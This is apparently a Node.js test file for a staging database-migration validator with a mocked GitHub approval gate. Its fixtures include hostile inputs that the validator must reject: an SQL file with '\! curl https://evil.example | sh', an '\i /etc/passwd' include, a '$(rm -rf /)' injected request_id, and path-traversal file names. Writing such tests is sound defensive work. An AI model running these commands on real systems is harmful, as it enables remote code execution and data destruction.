"use strict";

// Migration request validation (no database, no network).

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("fs");
const os = require("os");
const path = require("path");
const crypto = require("crypto");
const { validateRequest, checkEnvironmentProtection, main, ALLOWED_FILE_RE } = require("../../scripts/migrations/validate-request");
const { lintSql } = require("../../scripts/migrations/sql-lint");

const ROOT = path.join(__dirname, "../..");
const M2 = "supabase/migrations/20261111000000_closed_days.sql";
const M2_SHA = "a7ae829fecdc787c2f4f7f6bf877aafd28d5da28d1fa2946f7060dd7648b9e49";

const request = (o = {}) => JSON.stringify({
  version: 1, target: "staging", file: M2, sha256: M2_SHA, request_id: "staging-test-1", reason: "Apply migration 2", post_check: "status", ...o,
});
const rejects = (raw, pattern, root = ROOT) => assert.throws(() => validateRequest(raw, root), (e) => {
  assert.match(e.message, pattern);
  return true;
});

test("the real migration 2 request is valid (expected SHA-256)", () => {
  const sha = crypto.createHash("sha256").update(fs.readFileSync(path.join(ROOT, M2))).digest("hex");
  assert.equal(sha, M2_SHA);
  const r = validateRequest(request(), ROOT);
  assert.equal(r.file, M2);
  assert.equal(r.postCheckFile, "supabase/status.sql");
  assert.match(r.postCheckSha256, /^[0-9a-f]{64}$/);
  assert.equal(validateRequest(request({ post_check: "verify" }), ROOT).postCheckFile, "supabase/verify.sql");
});

test("the committed example request is valid", () => {
  const raw = fs.readFileSync(path.join(ROOT, "supabase/deploy/staging-request.example.json"), "utf8");
  assert.equal(validateRequest(raw, ROOT).file, M2);
});

test("only staging, only one allow-listed file, no inline SQL", () => {
  rejects(request({ target: "production" }), /"target" must be "staging"/);
  rejects(request({ sql: "drop table bookings" }), /unknown field "sql"/);
  rejects(request({ files: [M2] }), /unknown field "files"/);
  rejects(request({ file: [M2] }), /"file" must be one of/);
  for (const bad of ["supabase/status.sql", "supabase/verify.sql", "supabase/tests/booking_system.test.sql", "../etc/passwd",
    "/etc/passwd", "supabase/migrations/../seed.sql", "supabase/migrations/x.sql", "api/db.js", "supabase/migrations/20261111000000_closed_days.SQL"]) {
    rejects(request({ file: bad }), /"file" must be one of/);
  }
  for (const ok of [M2, "supabase/seed.sql", "supabase/holidays.sql", "supabase/cron.sql", "supabase/migrations/20261112000000_webhook.sql"]) {
    assert.match(ok, ALLOWED_FILE_RE);
  }
});

test("request fields are strictly validated", () => {
  rejects("not json", /not valid JSON/);
  rejects("[]", /must be a JSON object/);
  rejects(request({ version: 2 }), /"version" must be 1/);
  rejects(request({ sha256: M2_SHA.toUpperCase() }), /64 lowercase hex/);
  rejects(request({ request_id: "a b" }), /request_id/);
  rejects(request({ request_id: "$(rm -rf /)" }), /request_id/);
  rejects(request({ reason: "x" }), /"reason"/);
  rejects(request({ reason: "line1\nline2" }), /"reason"/);
  rejects(request({ post_check: "drop" }), /"post_check"/);
});

test("SHA-256 must match the committed file", () => {
  rejects(request({ sha256: "0".repeat(64) }), /SHA-256 mismatch/);
});

test("file system tricks are refused (symlink, missing file)", () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "mrkll-req-"));
  try {
    fs.mkdirSync(path.join(tmp, "supabase/migrations"), { recursive: true });
    fs.copyFileSync(path.join(ROOT, "supabase/status.sql"), path.join(tmp, "supabase/status.sql"));
    fs.symlinkSync("/etc/hostname", path.join(tmp, "supabase/migrations/20990101000000_link.sql"));
    rejects(request({ file: "supabase/migrations/20990101000000_link.sql" }), /regular file \(no symlink\)/, tmp);
    rejects(request({ file: "supabase/migrations/20990101000001_missing.sql" }), /does not exist/, tmp);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test("dangerous SQL files are refused even with the right hash", () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "mrkll-req-"));
  try {
    fs.mkdirSync(path.join(tmp, "supabase/migrations"), { recursive: true });
    fs.copyFileSync(path.join(ROOT, "supabase/status.sql"), path.join(tmp, "supabase/status.sql"));
    const cases = {
      "20990101000001_shell.sql": ["begin;", "select 1;", "\\! curl https://evil.example | sh", "commit;"].join("\n"),
      "20990101000002_include.sql": ["begin;", "\\i /etc/passwd", "commit;"].join("\n"),
      "20990101000003_notx.sql": "create table a (x int);\ncreate table b (x int);\n",
      "20990101000004_twotx.sql": "begin;\nselect 1;\ncommit;\nbegin;\nselect 2;\ncommit;\n",
      "20990101000005_crlf.sql": "begin;\r\nselect 1;\r\ncommit;\r\n",
      "20990101000006_unterminated.sql": "begin;\nselect 'oops;\ncommit;\n",
    };
    const expected = {
      "20990101000001_shell.sql": /meta-commands/,
      "20990101000002_include.sql": /meta-commands/,
      "20990101000003_notx.sql": /must start with BEGIN/,
      "20990101000004_twotx.sql": /only one transaction/,
      "20990101000005_crlf.sql": /line endings/,
      "20990101000006_unterminated.sql": /unterminated string/,
    };
    for (const [name, sql] of Object.entries(cases)) {
      fs.writeFileSync(path.join(tmp, "supabase/migrations", name), sql);
      const sha = crypto.createHash("sha256").update(sql).digest("hex");
      rejects(request({ file: `supabase/migrations/${name}`, sha256: sha }), expected[name], tmp);
    }
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test("every setup file passes the lint used by the workflow", () => {
  for (const f of ["migrations/20261110000000_booking_system.sql", "migrations/20261111000000_closed_days.sql",
    "migrations/20261112000000_webhook.sql", "seed.sql", "holidays.sql", "cron.sql", "status.sql", "verify.sql"]) {
    assert.deepEqual(lintSql(fs.readFileSync(path.join(ROOT, "supabase", f), "utf8")), [], f);
  }
});

// ---------------- approval gate (GitHub API mocked) ----------------

function fakeApi(env, policies, { status = 200, policyStatus = 200, authFails = false } = {}) {
  const calls = [];
  const fetchImpl = async (url, init) => {
    calls.push({ url, auth: Boolean(init.headers.authorization) });
    if (authFails && init.headers.authorization) return new Response("{}", { status: 403 });
    const isPolicy = url.includes("/deployment-branch-policies");
    const s = isPolicy ? policyStatus : status;
    const body = isPolicy ? { total_count: policies.length, branch_policies: policies } : env;
    return new Response(JSON.stringify(body), { status: s, headers: { "content-type": "application/json" } });
  };
  return { calls, fetchImpl };
}

const protectedEnv = {
  name: "supabase-staging",
  protection_rules: [{ type: "required_reviewers", prevent_self_review: false, reviewers: [{ type: "User", reviewer: { login: "mrkllofficial" } }] }],
  deployment_branch_policy: { protected_branches: false, custom_branch_policies: true },
};
const BRANCH = "claude/elegant-hawking-oukftc";
const gate = (api) => checkEnvironmentProtection({
  apiUrl: "https://api.github.com", repository: "mrkllofficial/mrkll-v1", environment: "supabase-staging", branch: BRANCH, token: "t", fetchImpl: api.fetchImpl,
});

test("approval gate: protected environment limited to the branch is accepted", async () => {
  const api = fakeApi(protectedEnv, [{ name: BRANCH, type: "branch" }]);
  assert.deepEqual(await gate(api), { reviewers: 1 });
  assert.equal(api.calls[0].url, "https://api.github.com/repos/mrkllofficial/mrkll-v1/environments/supabase-staging");
});

test("approval gate: missing environment, reviewer or branch policy -> refused", async () => {
  await assert.rejects(gate(fakeApi({}, [], { status: 404 })), /does not exist/);
  await assert.rejects(gate(fakeApi({ ...protectedEnv, protection_rules: [] }, [{ name: BRANCH }])), /required reviewer is mandatory/);
  await assert.rejects(gate(fakeApi({ ...protectedEnv, protection_rules: [{ type: "required_reviewers", reviewers: [] }] }, [{ name: BRANCH }])), /required reviewer/);
  await assert.rejects(gate(fakeApi({ ...protectedEnv, deployment_branch_policy: null }, [])), /selected branches/);
  await assert.rejects(gate(fakeApi({ ...protectedEnv, deployment_branch_policy: { protected_branches: true, custom_branch_policies: false } }, [])), /selected branches/);
  await assert.rejects(gate(fakeApi(protectedEnv, [{ name: "master", type: "branch" }])), /not in its deployment branches/);
  await assert.rejects(gate(fakeApi(protectedEnv, [], { policyStatus: 500 })), /cannot read deployment branch policies/);
  await assert.rejects(gate(fakeApi(protectedEnv, [], { status: 500 })), /cannot verify protection rules/);
});

test("approval gate: falls back to anonymous read for a public repository", async () => {
  const api = fakeApi(protectedEnv, [{ name: BRANCH, type: "branch" }], { authFails: true });
  assert.deepEqual(await gate(api), { reviewers: 1 });
  assert.deepEqual(api.calls.map((c) => c.auth), [true, false, true, false]);
});

// ---------------- CLI entry point ----------------

test("CLI writes outputs and summary, and never runs SQL", async () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "mrkll-cli-"));
  const out = path.join(tmp, "out");
  const sum = path.join(tmp, "sum");
  const reqRel = "supabase/deploy/staging-request.example.json";
  const code = await main(["node", "x", reqRel], { GITHUB_OUTPUT: out, GITHUB_STEP_SUMMARY: sum, GITHUB_SHA: "abc123", GITHUB_REF_NAME: BRANCH });
  assert.equal(code, 0);
  const outputs = fs.readFileSync(out, "utf8");
  assert.match(outputs, new RegExp(`^file=${M2}$`, "m"));
  assert.match(outputs, new RegExp(`^sha256=${M2_SHA}$`, "m"));
  assert.match(outputs, /^post_check=supabase\/status\.sql$/m);
  assert.match(fs.readFileSync(sum, "utf8"), /Waiting for approval/);
  const bad = await main(["node", "x", "supabase/deploy/missing.json"], { GITHUB_STEP_SUMMARY: sum });
  assert.equal(bad, 1);
  fs.rmSync(tmp, { recursive: true, force: true });
});
